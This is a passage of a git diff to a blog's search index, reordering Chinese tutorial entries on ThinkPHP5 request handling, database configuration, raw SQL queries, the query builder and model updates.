<span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL访问的ROOT地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'root:'</span> . $request-&gt;root() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL访问的ROOT地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'root with domain: '</span> . $request-&gt;root(<span class="keyword">true</span>) . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的PATH_INFO信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'pathinfo: '</span> . $request-&gt;pathinfo() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的PATH_INFO信息 不含后缀</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'pathinfo: '</span> . $request-&gt;path() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的后缀信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'ext: '</span> . $request-&gt;ext() . <span class="string">'&lt;br/&gt;'</span>;</span><br></pre></td></tr></table></figure></div>
+<h4 id="输出结果为："><a href="#输出结果为：" class="headerlink" title="输出结果为：   "></a><font color = red>输出结果为：   </font></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">domain:</span> <span class="string">http:</span><span class="comment">//tp5.com</span></span><br><span class="line"><span class="string">file:</span> <span class="regexp">/index.php url: /</span>index<span class="regexp">/index/</span>hello.html?name=thinkphp</span><br><span class="line">url with domain: <span class="string">http:</span><span class="comment">//tp5.com/index/index/hello.html?name=thinkphp</span></span><br><span class="line">url without <span class="string">query:</span> <span class="regexp">/index/</span>index/hello.html</span><br><span class="line"><span class="string">root:</span></span><br><span class="line">root with <span class="string">domain:</span> <span class="string">http:</span><span class="comment">//tp5.com</span></span><br><span class="line"><span class="string">pathinfo:</span> index<span class="regexp">/index/</span>hello.html</span><br><span class="line"><span class="string">pathinfo:</span> index<span class="regexp">/index/</span>hello</span><br><span class="line"><span class="string">ext:</span> html</span><br></pre></td></tr></table></figure></div>
+<h3 id="设置-获取-模块-控制器-操作名称"><a href="#设置-获取-模块-控制器-操作名称" class="headerlink" title="设置/获取 模块/控制器/操作名称"></a><font color=red>设置/获取 模块/控制器/操作名称</font></h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$request = Request::instance();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前模块名称是"</span> . $request-&gt;module();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前控制器名称是"</span> . $request-&gt;controller();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前操作名称是"</span> . $request-&gt;action();</span><br></pre></td></tr></table></figure></div>
+<p>如果当前访问的地址是 <a href="http://serverName/index.php/index/hello_world/index" target="_blank" rel="noopener">http://serverName/index.php/index/hello_world/index</a><br>输出结果为：   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">当前模块名称是<span class="built_in">index</span></span><br><span class="line">当前控制器名称是HelloWorld</span><br><span class="line">当前操作名称是<span class="built_in">index</span></span><br><span class="line">~~~ </span><br><span class="line">设置模块名称值需要向<span class="keyword">module</span>方法中传入名称即可，同样使用于设置控制器名称和操作名称</span><br></pre></td></tr></table></figure></div>
+<p>Request::instance()-&gt;module(‘module_name’);</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">### <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span> = <span class="string">red</span>&gt;</span>获取请求参数<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>$request = Request::instance();<br>echo ‘请求方法：’ . $request-&gt;method() . ‘<br/>‘;<br>echo ‘资源类型：’ . $request-&gt;type() . ‘<br/>‘;<br>echo ‘访问ip地址：’ . $request-&gt;ip() . ‘<br/>‘;<br>echo ‘是否AJax请求：’ . var_export($request-&gt;isAjax(), true) . ‘<br/>‘;<br>echo ‘请求参数：’;<br>dump($request-&gt;param());<br>echo ‘请求参数：仅包含name’;<br>dump($request-&gt;only([‘name’]));<br>echo ‘请求参数：排除name’;<br>dump($request-&gt;except([‘name’]));<br>输出结果为：<br>请求方法：GET<br>资源类型：html<br>访问ip地址：127.0.0.1<br>是否Ajax请求：false<br>请求参数：<br>array (size=2)<br>‘test’ =&gt; string ‘ddd’ (length=3)<br>‘name’ =&gt; string ‘thinkphp’ (length=8)<br>请求参数：仅包含name<br>array (size=1)<br>‘name’ =&gt; string ‘thinkphp’ (length=8)<br>请求参数：排除name<br>array (size=1)<br>‘test’ =&gt; string ‘ddd’ (length=3)<br><del>~</del></p>
+]]></content>
+      <categories>
+        <category>thinkphp5</category>
+      </categories>
+      <tags>
+        <tag>thinkphp5</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>3.thinkphp5数据库操作</title>
+    <url>/undefined/3.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<h1 id="配置文件定义"><a href="#配置文件定义" class="headerlink" title="配置文件定义"></a><font color=red>配置文件定义</font></h1><p>常用的配置方式是在应用目录或者模块目录下面的database.php中添加下面的参数：   </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line"><span class="comment">// 数据库类型</span></span><br><span class="line"><span class="string">'type'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line"><span class="comment">// 数据库连接DSN配置</span></span><br><span class="line"><span class="string">'dsn'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 服务器地址</span></span><br><span class="line"><span class="string">'hostname'</span> =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line"><span class="comment">// 数据库名</span></span><br><span class="line"><span class="string">'database'</span> =&gt; <span class="string">'thinkphp'</span>,</span><br><span class="line"><span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="string">'username'</span> =&gt; <span class="string">'root'</span>,</span><br><span class="line"><span class="comment">// 数据库密码</span></span><br><span class="line"><span class="string">'password'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 数据库连接端口</span></span><br><span class="line"><span class="string">'hostport'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 数据库连接参数</span></span><br><span class="line"><span class="string">'params'</span> =&gt; [],</span><br><span class="line"><span class="comment">// 数据库编码默认采用utf8</span></span><br><span class="line"><span class="string">'charset'</span> =&gt; <span class="string">'utf8'</span>,</span><br><span class="line"><span class="comment">// 数据库表前缀</span></span><br><span class="line"><span class="string">'prefix'</span> =&gt; <span class="string">'think_'</span>,</span><br><span class="line"><span class="comment">// 数据库调试模式</span></span><br><span class="line"><span class="string">'debug'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span><br><span class="line"><span class="string">'deploy'</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="comment">// 数据库读写是否分离 主从式有效</span></span><br><span class="line"><span class="string">'rw_separate'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="comment">// 读写分离后 主服务器数量</span></span><br><span class="line"><span class="string">'master_num'</span> =&gt; <span class="number">1</span>,</span><br><span class="line"><span class="comment">// 指定从服务器序号</span></span><br><span class="line"><span class="string">'slave_no'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 是否严格检查字段是否存在</span></span><br><span class="line"><span class="string">'fields_strict'</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></div>
+<p>type 参数支持命名空间完整定义，不带命名空间定义的话，默认采用 \think\db\connector 作为命名<br>空间，如果使用应用自己扩展的数据库驱动，可以配置为：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据库类型</span></span><br><span class="line"><span class="string">'type'</span> =&gt; <span class="string">'\org\db\Mysql'</span>,</span><br></pre></td></tr></table></figure></div>]]></content>
+      <categories>
+        <category>thinkphp5</category>
+      </categories>
+      <tags>
+        <tag>thinkphp5</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>4.thinkphp5数据库操作之原生查询</title>
+    <url>/undefined/4.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%8E%9F%E7%94%9F%E6%9F%A5%E8%AF%A2/</url>
+    <content><![CDATA[<h1 id="一丶数据库操作之原生查询"><a href="#一丶数据库操作之原生查询" class="headerlink" title="一丶数据库操作之原生查询"></a><font color=red>一丶数据库操作之原生查询</font></h1><h3 id="Db-类支持原生-SQL-查询操作，主要包括下面两个方法："><a href="#Db-类支持原生-SQL-查询操作，主要包括下面两个方法：" class="headerlink" title="Db 类支持原生 SQL 查询操作，主要包括下面两个方法："></a>Db 类支持原生 SQL 查询操作，主要包括下面两个方法：</h3><h4 id="1丶query-方法"><a href="#1丶query-方法" class="headerlink" title="1丶query 方法   "></a><font color=red>1丶query 方法   </font></h4><p>query 方法用于执行 SQL 查询操作，如果数据非法或者查询错误则返回false，否则返回查询结果数据集<br>（同 select 方法）。<br><font color=red>使用示例：</font><br>Db::query(“select * from think_user where status=1”);<br>如果你当前采用了分布式数据库，并且设置了读写分离的话，query方法始终是在读服务器执行，因此query方法对应的都是读操作，而不管你的SQL语句是什么。<br><font color=red>2丶execute 方法</font><br>execute用于更新和写入数据的sql操作，如果数据非法或者查询错误则返回false ，否则返回影响的记录数。<br><font color=red>使用示例：</font><br>Db::execute(“update think_user set name=’thinkphp’ where status=1”);<br>如果你当前采用了分布式数据库，并且设置了读写分离的话，execute方法始终是在写服务器执行，因此execute方法对应的都是写操作，而不管你的SQL语句是什么。 </p>
 ]]></content>
       <categories>
         <category>thinkphp5</category>
@@ -778,69 +827,13 @@ https://github.com/rapid7/metasploit-framework/wiki/How-payloads-work
       </tags>
   </entry>
   <entry>
-    <title>2.thinkphp5请求</title>
-    <url>/undefined/2.thinkphp5%E8%AF%B7%E6%B1%82/</url>
-    <content><![CDATA[<h1 id="请求信息"><a href="#请求信息" class="headerlink" title="请求信息"></a><font color=red>请求信息</font></h1><h4 id="如果要获取当前的请求信息，可以使用-think-Request-类，"><a href="#如果要获取当前的请求信息，可以使用-think-Request-类，" class="headerlink" title="如果要获取当前的请求信息，可以使用 \think\Request 类，"></a>如果要获取当前的请求信息，可以使用 \think\Request 类，</h4><p>除了下文中的   </p>
-<h3 id="request-Request-instance"><a href="#request-Request-instance" class="headerlink" title="$request = Request::instance();"></a>$request = Request::instance();</h3><p>也可以使用助手函数   </p>
-<h3 id="request-request"><a href="#request-request" class="headerlink" title="$request = request();"></a>$request = request();</h3><h4 id="当然，最方便的还是使用注入请求对象的方式来获取变量。"><a href="#当然，最方便的还是使用注入请求对象的方式来获取变量。" class="headerlink" title="当然，最方便的还是使用注入请求对象的方式来获取变量。"></a>当然，最方便的还是使用注入请求对象的方式来获取变量。</h4><p>例如：   </p>
-<h3 id="获取URL信息"><a href="#获取URL信息" class="headerlink" title="获取URL信息"></a>获取URL信息</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$request = Request::instance();</span><br><span class="line"><span class="comment">// 获取当前域名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'domain: '</span> . $request-&gt;domain() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前入口文件</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'file: '</span> . $request-&gt;baseFile() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前URL地址 不含域名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url: '</span> . $request-&gt;url() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取包含域名的完整URL地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url with domain: '</span> . $request-&gt;url(<span class="keyword">true</span>) . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取当前URL地址 不含QUERY_STRING</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'url without query: '</span> . $request-&gt;baseUrl() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL访问的ROOT地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'root:'</span> . $request-&gt;root() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL访问的ROOT地址</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'root with domain: '</span> . $request-&gt;root(<span class="keyword">true</span>) . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的PATH_INFO信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'pathinfo: '</span> . $request-&gt;pathinfo() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的PATH_INFO信息 不含后缀</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'pathinfo: '</span> . $request-&gt;path() . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="comment">// 获取URL地址中的后缀信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'ext: '</span> . $request-&gt;ext() . <span class="string">'&lt;br/&gt;'</span>;</span><br></pre></td></tr></table></figure></div>
-<h4 id="输出结果为："><a href="#输出结果为：" class="headerlink" title="输出结果为：   "></a><font color = red>输出结果为：   </font></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">domain:</span> <span class="string">http:</span><span class="comment">//tp5.com</span></span><br><span class="line"><span class="string">file:</span> <span class="regexp">/index.php url: /</span>index<span class="regexp">/index/</span>hello.html?name=thinkphp</span><br><span class="line">url with domain: <span class="string">http:</span><span class="comment">//tp5.com/index/index/hello.html?name=thinkphp</span></span><br><span class="line">url without <span class="string">query:</span> <span class="regexp">/index/</span>index/hello.html</span><br><span class="line"><span class="string">root:</span></span><br><span class="line">root with <span class="string">domain:</span> <span class="string">http:</span><span class="comment">//tp5.com</span></span><br><span class="line"><span class="string">pathinfo:</span> index<span class="regexp">/index/</span>hello.html</span><br><span class="line"><span class="string">pathinfo:</span> index<span class="regexp">/index/</span>hello</span><br><span class="line"><span class="string">ext:</span> html</span><br></pre></td></tr></table></figure></div>
-<h3 id="设置-获取-模块-控制器-操作名称"><a href="#设置-获取-模块-控制器-操作名称" class="headerlink" title="设置/获取 模块/控制器/操作名称"></a><font color=red>设置/获取 模块/控制器/操作名称</font></h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$request = Request::instance();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前模块名称是"</span> . $request-&gt;module();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前控制器名称是"</span> . $request-&gt;controller();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前操作名称是"</span> . $request-&gt;action();</span><br></pre></td></tr></table></figure></div>
-<p>如果当前访问的地址是 <a href="http://serverName/index.php/index/hello_world/index" target="_blank" rel="noopener">http://serverName/index.php/index/hello_world/index</a><br>输出结果为：   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">当前模块名称是<span class="built_in">index</span></span><br><span class="line">当前控制器名称是HelloWorld</span><br><span class="line">当前操作名称是<span class="built_in">index</span></span><br><span class="line">~~~ </span><br><span class="line">设置模块名称值需要向<span class="keyword">module</span>方法中传入名称即可，同样使用于设置控制器名称和操作名称</span><br></pre></td></tr></table></figure></div>
-<p>Request::instance()-&gt;module(‘module_name’);</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">### <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span> = <span class="string">red</span>&gt;</span>获取请求参数<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-<p>$request = Request::instance();<br>echo ‘请求方法：’ . $request-&gt;method() . ‘<br/>‘;<br>echo ‘资源类型：’ . $request-&gt;type() . ‘<br/>‘;<br>echo ‘访问ip地址：’ . $request-&gt;ip() . ‘<br/>‘;<br>echo ‘是否AJax请求：’ . var_export($request-&gt;isAjax(), true) . ‘<br/>‘;<br>echo ‘请求参数：’;<br>dump($request-&gt;param());<br>echo ‘请求参数：仅包含name’;<br>dump($request-&gt;only([‘name’]));<br>echo ‘请求参数：排除name’;<br>dump($request-&gt;except([‘name’]));<br>输出结果为：<br>请求方法：GET<br>资源类型：html<br>访问ip地址：127.0.0.1<br>是否Ajax请求：false<br>请求参数：<br>array (size=2)<br>‘test’ =&gt; string ‘ddd’ (length=3)<br>‘name’ =&gt; string ‘thinkphp’ (length=8)<br>请求参数：仅包含name<br>array (size=1)<br>‘name’ =&gt; string ‘thinkphp’ (length=8)<br>请求参数：排除name<br>array (size=1)<br>‘test’ =&gt; string ‘ddd’ (length=3)<br><del>~</del></p>
-]]></content>
-      <categories>
-        <category>thinkphp5</category>
-      </categories>
-      <tags>
-        <tag>thinkphp5</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>4.thinkphp5数据库操作之原生查询</title>
-    <url>/undefined/4.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%8E%9F%E7%94%9F%E6%9F%A5%E8%AF%A2/</url>
-    <content><![CDATA[<h1 id="一丶数据库操作之原生查询"><a href="#一丶数据库操作之原生查询" class="headerlink" title="一丶数据库操作之原生查询"></a><font color=red>一丶数据库操作之原生查询</font></h1><h3 id="Db-类支持原生-SQL-查询操作，主要包括下面两个方法："><a href="#Db-类支持原生-SQL-查询操作，主要包括下面两个方法：" class="headerlink" title="Db 类支持原生 SQL 查询操作，主要包括下面两个方法："></a>Db 类支持原生 SQL 查询操作，主要包括下面两个方法：</h3><h4 id="1丶query-方法"><a href="#1丶query-方法" class="headerlink" title="1丶query 方法   "></a><font color=red>1丶query 方法   </font></h4><p>query 方法用于执行 SQL 查询操作，如果数据非法或者查询错误则返回false，否则返回查询结果数据集<br>（同 select 方法）。<br><font color=red>使用示例：</font><br>Db::query(“select * from think_user where status=1”);<br>如果你当前采用了分布式数据库，并且设置了读写分离的话，query方法始终是在读服务器执行，因此query方法对应的都是读操作，而不管你的SQL语句是什么。<br><font color=red>2丶execute 方法</font><br>execute用于更新和写入数据的sql操作，如果数据非法或者查询错误则返回false ，否则返回影响的记录数。<br><font color=red>使用示例：</font><br>Db::execute(“update think_user set name=’thinkphp’ where status=1”);<br>如果你当前采用了分布式数据库，并且设置了读写分离的话，execute方法始终是在写服务器执行，因此execute方法对应的都是写操作，而不管你的SQL语句是什么。 </p>
-]]></content>
-      <categories>
-        <category>thinkphp5</category>
-      </categories>
-      <tags>
-        <tag>thinkphp5</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>3.thinkphp5数据库操作</title>
-    <url>/undefined/3.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/</url>
-    <content><![CDATA[<h1 id="配置文件定义"><a href="#配置文件定义" class="headerlink" title="配置文件定义"></a><font color=red>配置文件定义</font></h1><p>常用的配置方式是在应用目录或者模块目录下面的database.php中添加下面的参数：   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line"><span class="comment">// 数据库类型</span></span><br><span class="line"><span class="string">'type'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line"><span class="comment">// 数据库连接DSN配置</span></span><br><span class="line"><span class="string">'dsn'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 服务器地址</span></span><br><span class="line"><span class="string">'hostname'</span> =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line"><span class="comment">// 数据库名</span></span><br><span class="line"><span class="string">'database'</span> =&gt; <span class="string">'thinkphp'</span>,</span><br><span class="line"><span class="comment">// 数据库用户名</span></span><br><span class="line"><span class="string">'username'</span> =&gt; <span class="string">'root'</span>,</span><br><span class="line"><span class="comment">// 数据库密码</span></span><br><span class="line"><span class="string">'password'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 数据库连接端口</span></span><br><span class="line"><span class="string">'hostport'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 数据库连接参数</span></span><br><span class="line"><span class="string">'params'</span> =&gt; [],</span><br><span class="line"><span class="comment">// 数据库编码默认采用utf8</span></span><br><span class="line"><span class="string">'charset'</span> =&gt; <span class="string">'utf8'</span>,</span><br><span class="line"><span class="comment">// 数据库表前缀</span></span><br><span class="line"><span class="string">'prefix'</span> =&gt; <span class="string">'think_'</span>,</span><br><span class="line"><span class="comment">// 数据库调试模式</span></span><br><span class="line"><span class="string">'debug'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span><br><span class="line"><span class="string">'deploy'</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="comment">// 数据库读写是否分离 主从式有效</span></span><br><span class="line"><span class="string">'rw_separate'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="comment">// 读写分离后 主服务器数量</span></span><br><span class="line"><span class="string">'master_num'</span> =&gt; <span class="number">1</span>,</span><br><span class="line"><span class="comment">// 指定从服务器序号</span></span><br><span class="line"><span class="string">'slave_no'</span> =&gt; <span class="string">''</span>,</span><br><span class="line"><span class="comment">// 是否严格检查字段是否存在</span></span><br><span class="line"><span class="string">'fields_strict'</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure></div>
-<p>type 参数支持命名空间完整定义，不带命名空间定义的话，默认采用 \think\db\connector 作为命名<br>空间，如果使用应用自己扩展的数据库驱动，可以配置为：</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据库类型</span></span><br><span class="line"><span class="string">'type'</span> =&gt; <span class="string">'\org\db\Mysql'</span>,</span><br></pre></td></tr></table></figure></div>]]></content>
-      <categories>
-        <category>thinkphp5</category>
-      </categories>
-      <tags>
-        <tag>thinkphp5</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>7.thinkphp5数据库查询之查询构造器2</title>
-    <url>/undefined/7.thinkphp5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%9E%84%E9%80%A0%E5%99%A82/</url>
-    <content><![CDATA[<h1 id="二丶数据库查询之查询构造器"><a href="#二丶数据库查询之查询构造器" class="headerlink" title="二丶数据库查询之查询构造器"></a><font color = red >二丶数据库查询之查询构造器</font></h1><h2 id="一丶查询数据"><a href="#一丶查询数据" class="headerlink" title="一丶查询数据"></a><font color = green >一丶查询数据</font></h2><p>最普通的查询就是判断某个字段是否等于某个值，而select（）方法用于查询数据集，如果查询成功，返回的是一个二维数组，如果没有满足条件的话则返回空数组。      </p>
-<p>find（）方法用于查找满足条件的第一个记录（即使你的查询条件有多个符合的数据），如果查询成功，返回的是一个一维数组，没有满足条件的话默认返回null；   </p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'status'</span>,<span class="number">1</span>)</span>-&gt;</span>find();   </span><br><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'status'</span>,<span class="number">1</span>)</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
-<h2 id="模糊查询："><a href="#模糊查询：" class="headerlink" title="模糊查询："></a><font color = green >模糊查询：</font></h2><p><font color = green >查询name中含有’明’的数据</font></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'name'</span>,<span class="string">'like'</span>,<span class="string">'%明%'</span>)</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
-<h2 id="区间查询："><a href="#区间查询：" class="headerlink" title="区间查询："></a><font color = green >区间查询：</font></h2><p><font color = green >查询id区间为2~6的数据</font></p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">$result = Db::name<span class="function"><span class="params">(<span class="string">'data'</span>)</span>-&gt;</span>where<span class="function"><span class="params">(<span class="string">'id'</span>,<span class="string">'BETWEEN'</span>,[<span class="number">2</span>,<span class="number">6</span>])</span>-&gt;</span>select();</span><br></pre></td></tr></table></figure></div>
-<h2 id="二丶添加数据："><a href="#二丶添加数据：" class="headerlink" title="二丶添加数据："></a><font color = green >二丶添加数据：</font></h2><h2 id="添加多条数据："><a href="#添加多条数据：" class="headerlink" title="添加多条数据："></a><font color = green >添加多条数据：</font></h2><p>添加多条数据直接向Db类的insertAll方法传入需要添加的数据即可。<br><img src="https://i.imgur.com/AJwt1dE.png" alt="1">   </p>
-<h2 id="三丶更新数据："><a href="#三丶更新数据：" class="headerlink" title="三丶更新数据："></a><font color = green >三丶更新数据：</font></h2><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setFileld(‘name’,’thinkphp’);<br>setFiled方法返回数据的条数，没修改任何数据字段返回0；</p>
-<h2 id="四丶自增或自减一个字段的值："><a href="#四丶自增或自减一个字段的值：" class="headerlink" title="四丶自增或自减一个字段的值："></a><font color = green >四丶自增或自减一个字段的值：</font></h2><p>setInc/setDec如果不加第二个参数，默认值为1   </p>
-<h3 id="score-字段加1"><a href="#score-字段加1" class="headerlink" title="score 字段加1"></a><font color=green>score 字段加1</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setInc(‘status’);   </p>
-<h3 id="score-字段加5"><a href="#score-字段加5" class="headerlink" title="score 字段加5"></a><font color=green>score 字段加5</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setInc(‘status’,5); </p>
-<h3 id="score-字段减5"><a href="#score-字段减5" class="headerlink" title="score 字段减5"></a><font color=green>score 字段减5</font></h3><p>Db::name(‘data’)-&gt;where(‘id’,1)-&gt;setDec(‘status’,5);  </p>
+    <title>9.thinkphp5模型操作之更新数据</title>
+    <url>/undefined/9.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9B%B4%E6%96%B0%E6%95%B0%E6%8D%AE/</url>
+    <content><![CDATA[<h1 id="一丶模型操作之更新数据"><a href="#一丶模型操作之更新数据" class="headerlink" title="一丶模型操作之更新数据"></a><font color=red>一丶模型操作之更新数据</font></h1><h2 id="1丶查找并更新"><a href="#1丶查找并更新" class="headerlink" title="1丶查找并更新"></a><font color=green>1丶查找并更新</font></h2><p><img src="https://i.imgur.com/rHDc90y.png" alt="1"><br><font size=3>解释：  </font><br>调用UserModel模型的get方法;<br>“（1）”表示get主键为1的数据<br>save（）方法判断</p>
+<h2 id="2丶直接更新数据"><a href="#2丶直接更新数据" class="headerlink" title="2丶直接更新数据"></a><font color=green>2丶直接更新数据</font></h2><p><img src="https://i.imgur.com/XUUONWY.png" alt="1"><br><font size=3>解释：  </font><br>还是调用get方法选择数据<br>save（）方法直接进行保存，将name保存为刘涛</p>
